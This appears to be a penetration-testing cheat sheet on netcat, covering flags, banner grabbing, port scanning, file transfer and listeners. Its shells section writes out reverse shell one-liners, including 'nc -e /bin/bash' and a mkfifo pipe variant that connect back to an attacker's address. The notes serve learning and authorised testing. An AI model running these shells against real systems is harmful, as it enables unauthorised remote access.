
# Netcat

General-purpose TCP/UDP networking utility. Reads and writes raw data across network connections. Used throughout footprinting for manual service probing, banner grabbing, and port checking. Also foundational for shells and file transfers post-exploitation.

Available as `nc`, `ncat` (Nmap's version -- preferred, supports SSL), or `netcat`.

---

## Flags

| Flag | Description |
|------|-------------|
| `-v` | Verbose -- show connection info |
| `-vv` | More verbose |
| `-n` | No DNS resolution -- use raw IPs only |
| `-z` | Zero-I/O mode -- connect and close immediately (port scanning) |
| `-w <sec>` | Timeout in seconds |
| `-u` | UDP mode (default is TCP) |
| `-l` | Listen mode |
| `-p <port>` | Local port to use |
| `-e <cmd>` | Execute command on connection (not available in all versions) |
| `-k` | Keep listening after client disconnects (ncat only) |
| `--ssl` | Use SSL/TLS (ncat only) |

---

## Footprinting / Banner Grabbing

Manual connection to grab whatever a service sends on connect:

```bash
# Basic TCP banner grab
nc -nv <target> <port>

# With timeout (useful in scripts)
nc -nv -w 3 <target> <port>

# UDP service probe
nc -nvu <target> <port>
```

Service-specific probes -- type these after connecting:

| Service | What to send |
|---------|-------------|
| HTTP | `GET / HTTP/1.0` then press Enter twice |
| SMTP | Just connect -- banner appears; then `EHLO test` |
| POP3 | Just connect -- banner appears |
| FTP | Just connect -- banner appears |
| SSH | Just connect -- banner appears, then close |
| Rsync | Just connect -- then type `#list` |

---

## Port Scanning

Quick check when Nmap isn't available or you need to stay quiet:

```bash
# Check a single port
nc -zv <target> <port>

# Scan a port range (verbose shows open/closed per port)
nc -zvn <target> 20-100

# UDP port check
nc -zvu <target> <port>
```

---

## Listeners (Shells)

```bash
# Start a listener on your machine
nc -lvnp <port>

# Send a reverse shell to your listener (target machine)
nc -e /bin/bash <your-ip> <port>

# If -e is not available (most modern nc)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <your-ip> <port> > /tmp/f
```

---

## File Transfer

```bash
# Receiver -- run first
nc -lvnp <port> > received_file

# Sender
nc -nv <target> <port> < file_to_send
```

---

## Seen In

| Box / Context | Port | Purpose |
|---------------|------|---------|
| Rsync enumeration | 873 | `nc -nv <target> 873` then `#list` to probe shares |

